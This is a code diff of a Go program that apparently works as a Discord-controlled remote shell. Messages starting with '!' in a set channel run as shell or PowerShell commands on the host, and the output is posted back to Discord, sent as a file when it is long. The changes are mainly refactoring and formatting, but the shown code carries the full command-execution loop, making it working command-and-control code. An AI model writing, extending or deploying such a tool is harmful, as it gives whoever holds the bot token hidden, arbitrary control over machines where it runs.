@@ -9,21 +9,23 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"runtime"
 	"strings"
 	"syscall"
 	"time"
-	"runtime"
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/joho/godotenv"
 )
+
+
+var channelID string = setup()
 
 func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if m.Author.ID == s.State.User.ID {
 		return
 	}
 
-	channelID := setup()
 	operatingSystem := runtime.GOOS
 
 	if operatingSystem != "windows" {
@@ -35,7 +37,7 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 				out, err := cmd.Output()
 				if err != nil {
 					fmt.Println(err, " on ", command)
-					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again. error: " + err.Error()))
+					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again. error: "+err.Error()))
 				}
 
 				if len(out) > 2000 {
@@ -58,18 +60,18 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 				s.ChannelMessageSend(m.ChannelID, string(out))
 			}
 		}
-	}else{
+	} else {
 		if m.ChannelID == channelID {
 			if strings.Contains(m.Content, "!") {
 				command := m.Content[1:]
-	
+
 				cmd := exec.Command("powershell", "/C", command)
 				out, err := cmd.Output()
 				if err != nil {
 					fmt.Println(err, " on ", command)
-					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again. error: " + err.Error()))
+					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again. error: "+err.Error()))
 				}
-	
+
 				if len(out) > 2000 {
 					now := time.Now()
 					filename := "SOHAIL" + now.Format("2006-01-02_15-04-05.txt")
@@ -82,11 +84,11 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 						fmt.Println(err)
 					}
 					defer file.Close()
-	
+
 					s.ChannelMessageSend(m.ChannelID, "Output too long, sending as file")
 					s.ChannelFileSend(m.ChannelID, filename, file)
 				}
-	
+
 				s.ChannelMessageSend(m.ChannelID, string(out))
 			}
 		}
@@ -149,6 +151,18 @@ func setup() string {
 
 }
 
+func checkConnection(s *discordgo.Session, m *discordgo.MessageCreate) {
+	if m.Author.ID == s.State.User.ID {
+		return
+	}
+
+	if m.ChannelID == channelID {
+		if m.Content == "ping" {
+			s.ChannelMessageSend(m.ChannelID, "pong")
+		}
+	}
+}
+
 func main() {
 	err := godotenv.Load(".env")
 	if err != nil {
@@ -160,19 +174,7 @@ func main() {
 		log.Fatal(err)
 	}
 
-	channelID := setup()
-
-	sess.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
-		if m.Author.ID == s.State.User.ID {
-			return
-		}
-
-		if m.ChannelID == channelID {
-			if m.Content == "ping" {
-				s.ChannelMessageSend(m.ChannelID, "pong")
-			}
-		}
-	})
+	sess.AddHandler(checkConnection)
 
 	sess.AddHandler(execute)
 
